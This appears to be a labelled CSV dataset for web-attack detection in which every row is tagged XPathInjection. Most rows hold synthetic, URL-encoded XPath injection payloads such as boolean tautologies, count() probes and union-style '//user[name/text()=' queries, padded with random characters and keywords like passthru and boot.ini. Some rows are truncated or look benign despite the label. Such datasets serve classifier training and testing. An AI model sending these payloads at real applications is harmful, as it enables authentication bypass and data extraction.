id,class,vector
388,XPathInjection,/sPGMU2Flrs85j/an7apl/dEv323P2autoexecp-/sze3oaina1mgooeba3el/rvX8WC7I5PVFibCmNGRo/i9tRvd@Q6W@/deFH5iwTaotwgetQhD/p3otbnfeaie/aOP0-Pm.mdb?umAsl=rAHPWM1&eygin=500710&a7momftBsehee=56+or+++tuo8a3%2FltssR1%2Feie%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D61%5D+or++++8%3D&uiAaOn=said
391,XPathInjection,erebotsifd=de&tglom2zflxOsrpr=i&ylea=tnwgfth'     or   6 <     count(path/child::*) or    'eM'  ='&aIhoa=<eymIt1iy&ca2t2hhhsmAe5=476&btale=ersr%otsmoe&27eeshee8s=frow m7ciF)5t
402,XPathInjection,/taER0AEZPuMQqV5syG2/VeovJI_s27iCX.js?428cnvdnatHeOil=ea6%27++++or+++%28i+++%3C+++++count%28sa%2Fchild%3A%3Atext%28%29%29+and+++j++++%3C++++count%28ye4aG%2Fchild%3A%3Acomment%28%29%29++and+++++k+++++%3C++++count%28tneTu%2Fchild%3A%3A*%29++%29+++or+++%27edq%27+++%3D+++%27++hayeiLn%27+++++or&1odarjix=9XOgv3u
405,XPathInjection,/nimvesgI2/m3GrhreplaceURpand/ecxGiM2h/lln/eetirIwgdciRlnbymr5/HDo/usrMopennOX27Hue7H/nZP02XSUq40X4HB/wWeu7.jpeg?s2k7lTj7Elsfns=di&h1uneeoint=pr+u4uwseiNtrdf&uhslh=jplttnsth6iho&Womhter1u1=bB6vc
411,XPathInjection,vvbscriptBh9haccess_logGBI=51797&ydf=807&m1c=ec']    |    P   |     //user[   name/text()    = 'g8&dloa=gehotOa&t9hncsyaptg9= cadmin
419,XPathInjection,/arqoN8/glojcnoc94h7v2se/tLY5.v9/sovUG7.pl?etp=mrac1&t@W2DkW=%29ee&aArtpTR8aeexx2t=ee0da+au6c&Ntwrer=uxd%27+++++or++++%28i++++%3C+++count%28etfooi%2Fchild%3A%3Atext%28%29%29++and++++j++++%3C+++count%28stTm7t%2Fchild%3A%3Acomment%28%29%29++and++++k+++++%3C+++++count%28aI%2Fchild%3A%3A*%29+++++%29+++++or+%27fjo%27%3D++++%27+++++aeo%27++or&et28hEnNP=g&jurtae9oesr=g%3Crlocationitne
420,XPathInjection,/ukEwHwpL24Muhe5Bk6/LZTvP/ZhTfDAAcHR-/5l6dyBi@V5mwoH7hB/wlntHyyscjmniaiwu/msFWsw3vQk/dzrt/HkpasswdoptN1r/eis/tyi/pg@lye5Ir9l.sh?rasOsdpanht=eer64&sesntedTd=640555&bUa6Rnetder=7t6&nnetbtqr8sqRo=tkGq&tmscit7sCnrd=dEs4QH&ohr=fnreistMfhcoddMy6&dw1e=c-bfteggldRaae+uboot.initoy&l.-hSW=qrlhecc0csdrN&semioeTu2=salHtbgos4siitYanf&HpcFn1htpassRQ.4=nhsgcICopwyfss&sEm=jm%2Flsock_streameaI5ashavingapassthruTinputi+did&stcssyraevc7oie=c%7Ctsacrcr4leo+a&sar2Sdwt=i5sn4t1UCG9L&sennswioty=120&isiEno=eb3metah%27t%3Frrg-input%5Brse7l
427,XPathInjection,/iq6jQaeincludeHv3Ntmpqu/fd/ceoaporAa/t7T7t5rleonCa/0kphpDx/ZYYA-qps/ghsmn/4JGILhnf8IKT5elLn6e/eIIvP8/o2Ioh9imgX/rs52famaehQ.asmx?2ehLlaeR=cdOYp5sk&dy3Sctm=zzM987%2Fry8oke%2Fat%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D152%5D+or++%27anIrIhos%27%3D++++%27&KOdropcBt0betweenX=Rw&se=+&8qCW=29849873&npe=0972841738
430,XPathInjection,/r3tws.jpeg?re=%2FetEbvbscriptVob&Mra=cet&7dsacpjhtoa=s&SynZ0=scripteyoogtfihttps&enlai3sopYatror=49&sAnOwtuordse=optdhcmd&ire=ara0gOet%27+++++or+++s%2Fr%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D55%5D++or+%27ec7a%27%3D++%27&swgt=tmpsaH&epfaiaITefo=oVqjjre&Pr0replace4VMhttpT=r%7E&e6wmrila7etmAE=8709&xj5xn5nsr1fo=7662
435,XPathInjection,/pipS4w9gaS.php4?wssahrdgttqda=%3Fp&37wld5zrUeiT19i=sm1iPY2c_&7gclhhm=tDMeuoN&b0FNM=asbgsound-m26%3CNa+libro%29o&r8liwls9lAIo=8&naeiagudnrNae=02e%400p&vCL3C=79xN6qnGH&neqe=d&oetuRaaanf=cah%27+or+path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D++++or++++%27lerlyfe4%27+++%3D++++%27&0iq=%2Ble&ijihtsnrfeahrwt=n%3Ftaneestyleisutp
436,XPathInjection,/eM/ersdiee8/nhdDgebRsidacsodttis/9HMI/nOxtnYx/taHvraha8eeeXur5cd.shtml?4wRe=ap4i5adfaaOfe&Ens9eaBtc=400379677&Kaccess_log@6R6@F=79&pil=865&aerfnkytitslati=8+++++or+++1%3C+++++et%2FfN%2Fsde%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D223%5D+or+++++2%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27
441,XPathInjection,/lSbk0EAElPAneuT1D5bw/ocbodtio/sealv/2Nunr/Estitijcaltp8gCHalr1/irshrnmn3tbQeT.shtml?owsrteearltsor=404&lciwsnmmoAtm=toVM&rrdetibpc=9495077&vx_lQzVP=CCy&sAtt=y&raotfoef8=m2o8raanriroeKssen&zbe26ylESTsee=muG7ad6g&xFSlogJANdjM=27&lhne2nofT1Rskat=ayjb&cleefnbtp=rte8uwEOj70w&Axml91R_m=rE%40DZR&h93=+aiee&AHV3N=ec&eftph2dYWdnicform=+l
446,XPathInjection,alre75ew9=08&CG35PvO=1694763&ben10f7kntOicdi=nytg2K&algawnAeeauee=eHMvusH_
450,XPathInjection,/4sh5hgTt.exe?whtroltr=xe&dujater1lie=476&e6r9it2tiia=4290+++or++0%2FiW2%2FCsm%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D1%5D+++++or++++1%3D
456,XPathInjection,/ae9gt/isKhNj6b47wKxg/spYRPu9a7ew/include1.rIA2YT75seuC.png?aits=i9w&15npqYlie=ta8iSNv.5&de=113497231&co=z26tmd6i%27+++or+++1%3C+++++n1fd%2FvoeC%2FLRt%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D19%5D+++++or++++%27owapS6l2%27++%3D%27&XtaeunnnNene=5ynoeLin%27u&rtqntacp=geraSkmochagroup+bynrf&a0rdq5=fsincludesew9http%3Azrn4rtph&EeetccdvcsmEz=%3Dmir%29tsuacd
457,XPathInjection,/Tou/wBpRgV_Sy3eW/z0Kp/stoeoNhseep/entcrCtd6ya/rsIg2AhSdoGLct8Ych/cX/riaitceHlsolcntimsia/iaOri/Cs.jpeg?fh=to82%2FhlhxUt%2Faa19Le%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D8%5D+or+++++%27oja%27+%3D+%27&6EWtnuls3I0B=ejj77ap5I
460,XPathInjection,/p1laov/aQpxI/hZ_Nt0FgWCBUj7b1/thholdrh40o/48ietlu4o9us/opsfc/st/m-bbRtPvoK8uS0NpK/o3naooillik/yq/riM.css?azweae5aerh7Mj=154+++++or++1%3C++DeN6ss%2Flhmh%2Fi1w%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D0%5D+or+861%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27&ihzX=1811802897&skdii5d=2&echoB3sEVimgyVxb=cfr5t&YOpanj=77822&sfannfotfii=457880&r9rnriz9e2in=wh&urT481lrzxs5m=9519
465,XPathInjection,/nkeyvJ2YylES/QwG/hyrsiecvatenusi0jrti/tanstexokooegsromv/qk/eP8yT/styleEiMY1H.jsp?
466,XPathInjection,/itaETf6RQ2POKa/iMVOT7y6/andfidNg/v@Uzi/sieTG8iy933m5YX6hrD/rEYcul9woeXIAJCG62fU/e2qKKdK/sOi3mp.php?asbhArmn=37&ir=40&oyJtl9haet=7unflptbxeefkef&2sock_streamewM-u=i&RSEWB=acexech&m4aop=ctneA&ctr6hsTeo=8&nmalBekvag=ntt6nGvfkoW7&andwnsfvurDf=aew3jdu&oe=xmloptpxt&trvevkr=Oh%3Cs&oTa3ptom9kFyt5e=47497045&cmy=rcpoapprocessing-instructionnhrnh
471,XPathInjection,/3Yb0zm4HJpqLlKt/n-3fgp/eay/ootnmTSc4ioola/sPhh6B@k3Iq8rAWViRR/goeUavzEav.js?le6=2906226639&6etsof=sOthhrsye&Rbctpdn9dahrh=olew%2Fo%28j9ol%27pe%3Cn&isdImolud5aahc=nNesj&nTdiv-0IgvCixtermI=1596+++++or+++1%3C+ecENc%2F7pmee%2F092%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D569%5D+++++or+236%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27
474,XPathInjection,/aRmoZaKPJE5-emLKcQBt/dropHPJ3RBBRphpW6sJ/aDhXSljTLjRZ8SI-Xlz./WUebzxFidicoionah0e.asp?1ecenasufoe=oo8vr%27+++or++++1%3C+++++p%2F0r%2Ft6te%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D85%5D+++or+++++%27u7lehp%27++%3D%27&qetmArT=%29o&cladq=va3
477,XPathInjection,/stdin6v20J/H-Eimg5NK4cpCKdqh/taxildfttgabcevTos/rfqZPi-ALJdHSWhK/tCHi4Y/87l.js?KD.K8Uuj=ttRG&uHmocnaoEan=tp&e4qyabsjae=%28i++%3C++++count%28Eokgi%2Fchild%3A%3Atext%28%29%29+++and+++++j+%3C++++count%28ondrpl%2Fchild%3A%3Acomment%28%29%29++++and++k++%3C+++++count%28srts%2Fchild%3A%3A*%29+++++%29&bt=Fma&Sepo=oc+strensnaedbN&if=nOnanast9lcc%296e9C&amyiarehte2lr=yidna+%7C9++%2Fcatb&eed1ien=p
495,XPathInjection,/Hs1Key/and70e3QRRhBJkjaJ/uQPDnW0atZ5IltmpJP/be6ycshagfn0zp2tG/ls7/eeeebe/niSoeretetosnNsme/hNjg-isLl@PQmm6xX.jpg?eA=we%2Fiece%2FiaiOna%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D32%5D+or+++%27usaceo%27+++%3D++++%27
503,XPathInjection,/edcceuedaaptarge2an/7N_M/scte/ztxDEateqrLAb/daBMWRyVhsO@wfopen.htm?_.sYexec4in=l4ttl&1N@TTkwherepV22=ae9osph8omoi&ia=5fe&tisjxl=d&nj3iiItrn40ps=%28i+%3C+count%28yexn%2Fchild%3A%3Atext%28%29%29+and++j++%3C+count%28Egp%2Fchild%3A%3Acomment%28%29%29++++and+k++++%3C++++count%28tufn7%2Fchild%3A%3A*%29+%29&md7n3qe=dIn&awuaFn=631ntlhesnielesc&Ab=3525816&6vEn=etatceeisuhiee&ahrlrml6rd=uztautoexec+
520,XPathInjection,/scLU/lczso6nhIdtezjoa/pX-/gDscriptqHa/eoecaw/wMZ.mdb?repauYdsulex0=od%27pna7oor&8x775.q=38640&hesr=1roTg%27++or+++path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3DN%5D+++++or+++++%27vUmaeac%27++%3D++++%27&eid=5278&wnnikeedhs3ntf=idopenabaithuie
530,XPathInjection,/lOw7-W4gti0vX1_z/sk1KEEtMnw/h353r7shrtubeih6/cia_eHBpB8nUP.CCjD/otLe5/nMrhXr.sETH8el/aoU2cLUL89x/HrmHT6/u8aeeigasetuteniIdoe/a60nreeo/elliAjuhlbechret/ajnitbontWstolMaygi.swf?lslkth=basa%27++++or+++++%28i++++%3C+count%28drsvt%2Fchild%3A%3Atext%28%29%29++++and++j++%3C++++count%28tcrie%2Fchild%3A%3Acomment%28%29%29+++++and++++k+++%3C+++count%28eet%2Fchild%3A%3A*%29++++%29++++or++%27eer%27+++%3D+++%27++4sug%27+++++or&s92peaioiHeu=sAahh&ecisl81=570
532,XPathInjection,skate=0ranent5athcdr4n&XfcatL=sshto']   | P    |    //user[  name/text(    )   ='oe
538,XPathInjection,/cOQiJ31httpsCstdin_O2dropQ/o8_X3PCl/rselitpui8daeaAq.cfm?6xafSmHNwindow.open0=hPcz%404i_Z&nhT0moo0tadgd=ii&el=ItiframeRsock_streamexival&sgM.Q=7e%25u4objectna&pZUobjectPbodyb=sllrdirtetrO&ae9rw90pievlsc=1949&yiBlq=wQfDCw7&IgQcc@nvbscript5bbU=shy9sehiu4id&rrilnln=7912646&tdz=bsi6&Y69d9_-ohtaccesJ-=t8-&Sd=%40%26t&FselectwgNYh@iKPe=nm.&yu2=3994370
540,XPathInjection,gU5AiFwhere2exec2hz=1665&sblynczhi4eem1=m1&eb0eaSh2p8i=0&socaoa00=845110&7h=jio&ujof6ritASfiAam=exec&0ARsId4uraa=08417579&zcehpq=ayPdK&tjhs3ecstoee=37559863&67MuZvfhl=tysseeeDlefa&rpe1eswthar=SeSlesF&8xp=:nalracowwlatn a2
542,XPathInjection,/fIV0k8n7lHechoD1I9/s27wjsLh/iBdn.Wg5_v/sgLFbN_uDSk.cgi?onnptkh=5496979870&sktP5it0=7&7sptuerrltGt=hyH%40GKEYIC7K&noaniee=wttah%2Flz%2FAid6%2Fchild%3A%3Anode%28%29%5B++++position%28%29%3D30%5D+++++%7C+k%2Fbieair%2Fnrg9ap%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D3%5D++++or++++%27sU%27++++%3D++++%27&ihzeArllf=insertswewgs7+&WAgs2e=1221394995&nYaK3uW=nu%29Eu&9dfazl7etse=dP3wJNnnHF
548,XPathInjection,/aEialuecoiOecten3mW/oiemLoenaisl/peoit4x/lElrltoynaonrTlm/olBenhgfadd37ehVe/mShu/w9ABxHu.0EZZyf4t/d-NG2kWS0iC1/iLcaf/9soaXhtciemh.asp?IRfjo0eaNiorh1l=s..sYf%40D67&L@JbetweenANT.deletegmK=4390&so4=LedasswauoE&in0idAnnehhT9d=%28i++++%3C+++count%28c7c%2Fchild%3A%3Atext%28%29%29+++++and+++++j+++%3C+++count%28rT7%2Fchild%3A%3Acomment%28%29%29++and+k+++%3C+count%28Rn%2Fchild%3A%3A*%29+++++%29&eHnnsh=3i6cpacieesr
553,XPathInjection,/wMHaAGDPRI2lB/sD_zOC8/bXZLzAK9PY/dQzr24jlizU5/hGx/FBuZ4BoujZ/6VsystemsbetweenlWTp-/Mxterml_1/o3.jpg?xzMU1qstdinky=boot.iniSes%7Cd%3DCdnt6xt&le3H=521&GmG7FaJQVua=a3t%27++++or+%28i+%3C+++++count%28fehaD8%2Fchild%3A%3Atext%28%29%29++and+++++j++%3C+++++count%28spi%2Fchild%3A%3Acomment%28%29%29+++++and++++k+++++%3C++++count%281w%2Fchild%3A%3A*%29++++%29++or+%27cfF%27+%3D++%27+++DrlasTot%27+++or&nrifor2stulex=eIqefGd%40gb
564,XPathInjection,/opJUgqC4shw/aBobebtfoayc/2cSpmfzjGL7g8KWpe/wehbeetadtoridw2it/3i1lseicrnesh/0oM/nu/Toh.htm?tatrnotc=dh6snxmdsnl&ci3sbantywrdH6=622&eaqShse=n6p%2Feno3%2Fenon%2Fchild%3A%3Anode%28%29%5B++position%28%29%3D2%5D+++%7C++++Td%2Fa%2Fitsao%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D710%5D+or+%27mmcaDti%27++%3D%27&8rarlu9num0=tfh
573,XPathInjection,/acdfy/atzsNenturOtahrpooN/nPw4vbscript882dreplaceR15mr/cr7V/rppC4e@2/e1lMaK8bVs/j-OEQ-eo/sBix-biTostkTEMymc0B.pl?eta4ec=EtmE+&waVdbd=b50Et&al0ebe=024+++++or+count%28path%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D%28%28i%2Bj%2Bk%2Bl%2B1%29%5D+++%7C+++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1+++or+++823%3D
574,XPathInjection,/HXkYISQV/eaiqtuchrosinr06i6ds/nIC6dcevzGYeS-/N@SPEA/iEhhT8aRT/stR7Avxmn6t9sD.pl?sutiEeF=lo&dXpXKKGKTsow=iBLeeXkwKE74&oeO=acopy&NewiccsTtiuroga=aea2tswao&rt5tne7iniesmr=ynnboot.iniitipassthrue+hbc&mztaec=e6h&stdinwp-tTj3D=81029&dlntow=419+++++or++1%3C++osii%2Fkouank%2FenNas%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D031%5D++or+++++8470%3D%27%5D+%7C+%2F*+%7C+%2Ffoo%5Bbar%3D%27
584,XPathInjection,rrThrtneyA=attidPhtDjRcbtreh8
587,XPathInjection,/R-9VCo7e/ttdesttluast1pNhhMe/ahxuGwm7/srFieb0so/oosasyn0pHr/no/rXBqgUwWX7zJIGED3Z/aJN/tXrzkXbQ1w8TH66T/pK.dTD4.jpeg?6amanne3=i-cfxrwr%3Encss8+a+%3Fli&dabrhK=8628001343&iy=tlehndtt0nikaISper&AtmpU2mochashutdown=621++++or++tz%2Foa%2Fagn2rt%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D8%5D+++or++++6403%3D&nSp7ca9hdt=9&ceeLufshnts=exRiIU17eH9N&qdUhz-himgLX=0e95
600,XPathInjection,/nndayeaifhsyeiOiiCs/DFTA/ef@p5xyVAWH/nuFeolraoepxh/sG29FE1wy96/g0trnfneDp5ceft/nHOu8sMoHWmm/ufbrgenae/aoUo/BGTX4T6allFLc8Cz/connecthv/igotn.jsp?.NbNKQ=b47e&554atZir=6373402&nmTjenUdst9swA8=ecx4&ab0aret4Enfs=qreplaceeippoots&elEsutte5tdsao=134324100&e5tli=293258&nSh9hph1ata=llmo+&ttardpnckaLnno=oj8&geed=3o%3Bp+oznifegd+&6aAlp7oaa26ern=12121+++or++ienos%2FSm%2Fn%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D84%5D+++++or+++75%3D&saOsi=660&coaMgk9au7e1=590&NuhEw=96900091&oxsroio4bpa=61&fu4Metcku0FlU=+ea
605,XPathInjection,/wqeJrLnVzb/shqowie4svaaRelea5ka/tgmhahnaastgnuCt/iQPrcp@-L2G_K/styleChA/eBmX_passthru5Hb/abEs.4y_oVUoLlrTCV.jpeg?HreomtL2oer=Ne2h8oh%27++++or+1%3C+++++o9Xgsz%2FcahE%2FhdHuj%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D2%5D+++++or++%27t0tk%27++++%3D%27&tRtLenbol=%5Cha3pl%3F0hhstyleft%3AasHza&isb2n7onnh=f
617,XPathInjection,/h5qYr6xnw/LlrsHehaz4smppHy/eloatsllerUwTi/lK37cmd.exe?h7Aeoo4hh=aEtfehoati9eneoh&edbaou=n6tsekmgitne2cjce&e9oi4iai=eD&0a33homedocumenti=fC9n6sI7yl&a6e=%28i+%3C+count%28qriia%2Fchild%3A%3Atext%28%29%29+and++++j++++%3C+++++count%281i%2Fchild%3A%3Acomment%28%29%29+++and+++++k++%3C++++count%28dh%2Fchild%3A%3A*%29++++%29&39r=%27n&xtsttSh=544294&tfMPsxRCa=s3ue+5%26s%2FeUeybodyinclude0%40%40&uilosegagaie1d=rOjW2xh8V3h&oooNre4azgk=et&cagkvu40Cnr0ema=R3e&ehietnoyas=5868830&X5LkQhnx7GQ=tnea
618,XPathInjection,/AqEZkhvar/nxmNaEV14Tr-X4@@y8Ai/hUqGkz/0X8YI/eumJPqJK2OEQxr-c4lM/sn6a3D/eeu3osel5e2mesYtthr/eF72eHqW9/7zP/aueqhom/7ls_B@HEJs@qz-I9/ylvKJqygqrdocumentlibM.php4?jA.jmailL=i8n&hhnraa0=adolwoOdr0an&VDYxhtacces3s=maEe%27++or++ad%2Fynadtr%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D040%5D+++++or+%2702rrn%27+%3D%27&vwkEnso=r%27rbe%2Bca1e&0oYj=hkWLp2Q3c&SxaeeetejRugef=f&bbyDve6weNrl=d5et&sKqtr5T@agws=ic&Xqg4QhtpassPE4U=324
622,XPathInjection,/Sgroup
626,XPathInjection,/s-@SNnQAaO71.a@y/et/geAn84xjsmz23iI8i6ed/oewjpJzq/d86Lxqrj44UxRgPlX6.html?sroari=egOBK8_&etbfEaTwfltezD=t%2F9wrim&wniEEsBnav=Otsa%2FNe%2Fine%2Fchild%3A%3Anode%28%29%5Bposition%28%29%3D791%5D+or+%27aesn1oeh%27+++%3D++%27&q5Hd5=fYCGAPeIA2&no=aooow&ni1hp=n%40u&eCl@VFkYgconnect=nsuiframe&eRala=f8Jk7bJqjAb&tenhteetthcljn=rrsSftpqlocationy
634,XPathInjection,/z1q8SC5Sm/eepEbhooeta9r/9whBejoC/9aascmYreNqtrzz5/trdiscOgemEre/yzvG/m29bTJBtse4/ovonc/E6tsbna4enT/3Q7/sNO.J7e5fg.php4?etxlygnAg=a+usruia5j&YadminLwlogQNp9=bbUes9s%27+++++or+Hsoesy%2Fness%2Fchild%3A%3Anode%28%29%5Bprocessing-instruction%28%29%3D60%5D+++or++%27Bepsis%27++%3D++++%27&aesfo7=arm5ne&g2Cwget3UUy2usrI=mt5dt%3C
651,XPathInjection,/pWjSetc/b5GQsKUKio6/1Cqg/nYPTLk/thycvhf8e/ontWDHeuNZ/mdihVi1Ben/hwkDQWjAp.JeS-.css?
652,XPathInjection,/0a1.Oaccess_logX9IzhttpsF9QM.jsp?isajrot=so2ia%27%5D++%7C+P++++%7C+++%2F%2Fuser%5B++++name%2Ftext%28+++%29++%3D+++%27eerf&uchnAeflnttetvE=m%3FptluyEl%2Fd%29rq&x7tA=50&7sein2g4a=1oservicesitr4aksR%27nH%40eoA&iesnnfrrd=rhnohvnpnemefm&mjorrTHaob8=imeta&MokuT0KoNNsv=atG&lmhKeme0SHcaa=78
655,XPathInjection,/aUtjHv.php4?ogmoPii9sd=systemotm%3B%3Fd0ao&sRhemoefT=ewVF.Dik&dzbaormvsuaoee=douhaBaon5grhins&vhavingFhNdiv9=iiey2St%27+++or+++++%28i++++%3C++count%28dn%2Fchild%3A%3Atext%28%29%29+++and+++j+%3C+++count%28rEst%2Fchild%3A%3Acomment%28%29%29++and+++k++%3C+count%28aye%2Fchild%3A%3A*%29+++%29++++or+++%27r6oqhl%27+++%3D+%27++++hbre%27+++or&AFnfdEuxvSiieni=7teaa
674,XPathInjection,RDugu=mznnrl'     or   count(  path/child::node()[position( )=((    i   +  j   +k    +l  +1)]     |  path/child::*()[position()=(k+1)])=1  or  'el7teo'  =  '   5tcde2'   or
693,XPathInjection,/iwtp3cPgipas6ty/fcMu3UGAH4R.EBCRKXuB/1ntudErnkoXI.js?te8ee=72035&gaf1nebmjankttn=y0fncfirKwoeilsL&ra=seotrnlswu&7m7te=itHusOm&eozstnE8s=yMu6dwsefa4&aca0aNlo=a5ruhxoigtttoae&sooxhdhEltaaHN=ifuoaKreee&6jip1x9eei3at=mjddssa0nocso&tewtps1dtwnntne=11&.fNhRie=24
708,XPathInjection,/rmu94SgOIODxo_.O2Y/o10/lckJ8PZ8XNIec.LZ9ob/frn8fs_AUrWJ.shtml?yitupr=9&QMfUsamy=35290&tgsoO9ejebytbos=DshutdownL%3D+et+nek&9thxsr=+lch&lwo2=iv6t&mc=toit%27+++++or+++++count%28+path%2Fchild%3A%3Anode%28%29%5Bposition%28+++%29%3D%28%28+++i+++%2Bj++++%2B+k+++%2B+++l++++%2B+++1%29%5D+%7C++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1+++or++%27Uiouoi9%27%3D%27++++tbgttee%27++or&rSpoe=zearioaihaheeree
711,XPathInjection,/7nUinuhetcV/d7appYheKuq/wY0NSlRHC4d8WC5/lX@B6IGH0blIj/2tdCnph-CscripttrTdiv56/awfwrcV/tR/oe.aspx?tbbbeigq2ttDiae=4533052&Acbi=h0pfqUqeowSer3t9nR&elpuhnlpoagal=teTIe%2Ft%2Fi9biOt%2Fchild%3A%3Anode%28%29%5B+++++position%28%29%3D91%5D+%7C+++++oe%2Flgucs%2Fu%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D517%5D++or++++%27soiIdo%27++++%3D+++%27&eahILmle=e+&nadderth=65f1l%40h0c-&Iloerozhhc=ejlocationgroup+byall4upc%28saStTj&nI=9sduhdHmdusoe&zo=exYJtt%40AJn&e6ihajeheei=nnyafnIlroestnecc&Bthxd=78872
724,XPathInjection,/2m4gobr7gvnrJneos/XRzposition8delete/id@xaautoexec.tiff?ere5le2t=7fhoejonet1nio&ee=e0t6zde%27++++or++%28i+++++%3C+++++count%28ttN%2Fchild%3A%3Atext%28%29%29++and+++++j++++%3C+++++count%28rsqser%2Fchild%3A%3Acomment%28%29%29++++and+++k++++%3C+++count%28isnor%2Fchild%3A%3A*%29++%29+or+%27nl%27%3D++%27+++++elt%27++++or&l.-9D.Hb=376225&u1hsts=e6oCp
734,XPathInjection,/dS-cvlkPY_2KU/rVSYUN8b8VdiCa/NiDpt4IxOl-YWk/lwdJSOMNP0swrZ_b_xQ-/h33@RQ9/2script/mZKhbCD90Sr/nacetyaofsohohvc/ybgVkgvC6D.Y6vb9Y7/iwreIhoenm/cF@_ozzg95/uacethnp9eesfeol.gif?dpa19stvar=5sdeC%27+++++or+count%28+++path%2Fchild%3A%3Anode%28%29%5Bposition%28++%29%3D%28%28i+%2B+++j+++%2Bk+++%2Bl++%2B++++1%29%5D++%7C++++path%2Fchild%3A%3A*%28%29%5Bposition%28%29%3D%28k%2B1%29%5D%29%3D1++or+%27cyd%27++%3D%27+eabtUhh%27++++or
747,XPathInjection,/opYehewtueSem0ldh/ele0OrdCe/0ancIarlrTEnnHedee/rlDGhSMJaIBszIQsy6/nsTOK9IVO4T-wGsR1O/iatl/wtiadhtDtralq/tvQIAa/5kQqfreYB_nW2/ymmtvyGuBDSGsM/Drnc-klL.tiff?eEfetqeeeO=cda%27+++++or+1%3C++++ha%2FhoUo%2Fte5%2Fchild%3A%3Atext%28%29%5Bposition%28%29%3D37%5D+++or+++%27hyp%27++++%3D+++%27&sock_streamauI=catsoptt%5Dhhxp_+n%3D&9-O9ULZW=i9el&W1JDA2QzRLn=157&oSeIeet5ad6md=268&C-Mnvbscript=miLfrmp9sAwh&ode=htaTorh8YshazV&yreiistSnloh=+h&emrhirpAe9c=688526568&nnhhn0=oT
748,XPathInjection,/eeetuaCsl5toso/n-bgwMlwkWaMjIN0Ll3/_84OdacceptlOwL/tLnfIue496.mspx?ZxRHufprocessing-instructiona=940166782&imcahdcyteokpt=nUgq7ZGd_EF&eq73o=extdnTF_uM&s8ldolfPhrnWoit=teeebgsounden+tmetamtp56y7&asp1ny9neehLss=486&ppmvrsa6tAe=2441&wqoy7lxpAttbrdo=nb3xyor&uetljngsheu6ha=%28i+++++%3C++count%28et%2Fchild%3A%3Atext%28%29%29+++++and+++j++++%3C+count%28ttewq%2Fchild%3A%3Acomment%28%29%29+++and+++++k++++%3C++count%28eoed%2Fchild%3A%3A*%29++++%29&cbsn7hdxo1Sa=altgr
750,XPathInjection,/4QmI/5J_ncwx21/rqKJhaxvpehV-6k2/hbeiaeErpIkaw7/.yhrOs94/ieAt3iamenEf/b8Vg/UT/86HZxbI_ZP6d.tiff?7a2ssbfh2rle=35337&5vstyleaHsystemvrDgroup
754,XPathInjection,/nX-tmnrC/tQNRlO.P732v/smrRrici.htm?lJ9hGmnbhM=%28i+++%3C+count%28aftt%2Fchild%3A%3Atext%28%29%29++and++++j+++%3C+count%28h7%2Fchild%3A%3Acomment%28%29%29++++and+++k++%3C++++count%28rmarf%2Fchild%3A%3A*%29++%29&tThntasemhyao=+mrwmochaishafv&Txp_pjUbadmink=u4yeOGxQNGaH&dr=nuf%26g+r%7CAS%7C%24edi&oeePvepdrIqm=ce5npuztc8ae&Srndqo=81809405&tjpk=i
